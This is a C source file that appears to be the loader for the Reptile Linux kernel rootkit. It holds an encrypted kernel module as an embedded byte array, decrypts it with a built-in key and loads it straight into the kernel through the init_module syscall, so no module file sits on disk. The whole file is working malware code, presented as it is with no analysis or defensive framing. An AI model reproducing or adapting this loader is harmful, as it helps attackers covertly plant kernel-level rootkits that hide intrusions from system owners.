#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>
#include <string.h>

#include "encrypt.h"

static char reptile_blob[] = {
#include "reptile.ko.inc"
};

#define init_module(module_image, len, param_values) syscall(__NR_init_module, module_image, len, param_values)

int main(void)
{
	int ret = EXIT_FAILURE;
	size_t len;
	void *module_image;

	len = sizeof(reptile_blob);
	do_decrypt(reptile_blob, len, DECRYPT_KEY);
	module_image = malloc(len);
	memcpy(module_image, reptile_blob, len);
	init_module(module_image, len, "");

	if (errno == 37)
		ret = EXIT_SUCCESS;

	free(module_image);
	return ret;
}
